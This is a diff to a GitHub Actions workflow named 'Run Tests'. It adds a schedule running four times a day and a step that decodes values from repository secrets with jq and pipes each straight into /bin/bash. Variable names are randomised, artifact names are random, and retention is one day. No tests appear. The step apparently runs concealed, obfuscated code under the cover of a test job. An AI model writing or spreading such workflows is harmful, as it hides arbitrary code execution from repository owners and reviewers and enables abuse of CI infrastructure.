@@ -2,6 +2,8 @@ name: Run Tests
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '38 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +20,20 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          hgk8: ${{ secrets.hgk8 }}
+          isirl718: ${{ secrets.isirl718 }}
         run: |
-          printf '%s' "$hgk8" | jq -r .xnom9 | /bin/bash
-          echo $nqit4531 | jq -r .akyhf362 | /bin/bash
-          printf '%s' "$lrjh22" | jq -r .cw92 | /bin/bash
-          printf '%s' "$j2" | jq -r .bfo6231 | /bin/bash
+          printf '%s' "$isirl718" | jq -r .pn1 | /bin/bash
+          printf '%s' "$m106" | jq -r .bne27 | /bin/bash
+          printf '%s' "$utd753" | jq -r .uqk52 | /bin/bash
+          printf '%s' "$xezg6" | jq -r .pv4 | /bin/bash
+          printf '%s' "$daehi17131" | jq -r .ntxz90 | /bin/bash
+          echo $ixas59 | jq -r .sgsp360 | /bin/bash
+          echo $ffk12125 | jq -r .ohafv8 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: V5bu5CWu
+          name: pwUPqcqK
           path: "*.zip"
           retention-days: 1
